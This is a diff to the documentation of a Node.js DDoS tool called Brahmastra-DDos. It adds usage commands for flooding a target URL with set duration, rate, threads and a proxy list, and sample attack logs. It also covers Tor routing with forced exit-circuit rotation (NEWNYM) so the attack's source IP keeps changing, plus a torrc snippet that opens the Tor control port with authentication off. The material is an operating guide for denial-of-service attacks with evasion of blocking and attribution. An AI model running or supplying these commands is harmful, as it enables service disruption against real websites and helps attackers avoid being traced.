@@ -43,9 +43,17 @@ node Brahmastra-DDos.js https://example.com 10 16 2 proxy.txt --demo --tor --tor
 
 ### Standalone Tor IP Check
 ```bash
-# Check current Tor IP without attacking
+# Check current Tor IP without attacking (flags only)
 node Brahmastra-DDos.js --tor --show-tor-ip
 ```
+With Tor down the command exits immediately with:
+
+```
+[ERROR] Tor SOCKS proxy is not running on 127.0.0.1:9050 or :9150 (ECONNREFUSED)
+[ERROR] Start Tor first: run 'tor' in a terminal, or launch Tor Browser, then retry
+```
+
+Usage is mirrored to `tor-debug.log` for diagnostics.
 
 ## 🔧 Tor Circuit Features
 
@@ -99,10 +107,12 @@ node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor
 [Brahmastra-DDos] (14:30:15) Attack Thread 3 Started
 [Brahmastra-DDos] (14:30:15) Attack Thread 4 Started
 [Brahmastra-DDos] (14:30:15) The Attack Has Started
-[TOR CIRCUIT] (14:30:45) Rotated to Circuit 2
-[TOR CIRCUIT] (14:31:15) Rotated to Circuit 3
+[TOR CIRCUIT] (14:30:45) Rotated to fresh Tor exit circuit (NEWNYM) #2
+[TOR CIRCUIT] (14:31:15) Rotated to fresh Tor exit circuit (NEWNYM) #3
 [Brahmastra-DDos] (14:31:15) The Attack Is Over
 ```
+
+> **Note:** With `--tor`, the tool performs a pre-flight check before starting. If the Tor daemon is not running on `127.0.0.1:9050` (or Tor Browser SOCKS on `:9150`), it exits immediately with instructions instead of sending doomed requests.
 
 #### Tor with Custom Rotation
 ```bash
@@ -240,7 +250,13 @@ NewCircuitPeriod 30
 
 # Maximum circuits
 MaxCircuitDirtiness 30
+
+# Expose the control port so the tool can force fresh exit circuits (NEWNYM)
+ControlPort 9051
+CookieAuthentication 0
 ```
+
+> **Note:** Without a reachable control port the tool falls back to cycling its SOCKS socket connections instead of signaling NEWNYM, and prints a single warning per rotation interval. The tool probes control ports 9051 and 9151 (Tor Browser default) automatically.
 
 **Windows** (Tor Browser):
 - Tor Browser automatically configures the SOCKS proxy
@@ -321,9 +337,9 @@ console.log(`Next Rotation: ${new Date(torStatus.nextRotation)}`);
 node Brahmastra-DDos.js https://target.com 300 32 4 proxy.txt --tor --tor-rotate=30
 
 # Watch for rotation messages
-[TOR CIRCUIT] (14:30:15) Rotated to Circuit 2
-[TOR CIRCUIT] (14:30:45) Rotated to Circuit 3
-[TOR CIRCUIT] (14:31:15) Rotated to Circuit 4
+[TOR CIRCUIT] (14:30:15) Rotated to fresh Tor exit circuit (NEWNYM) #2
+[TOR CIRCUIT] (14:30:45) Rotated to fresh Tor exit circuit (NEWNYM) #3
+[TOR CIRCUIT] (14:31:15) Rotated to fresh Tor exit circuit (NEWNYM) #4
 ```
 
 ### 📈 **Performance Metrics**
@@ -611,7 +627,10 @@ node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> --tor --tor
 # Demo mode with Tor
 node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> --demo --tor
 
-# Check Tor IP
+# Standalone Tor IP check (no attack)
+node Brahmastra-DDos.js --tor --show-tor-ip
+
+# During attack: show IP
 node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> --tor --show-tor-ip
 ```
 
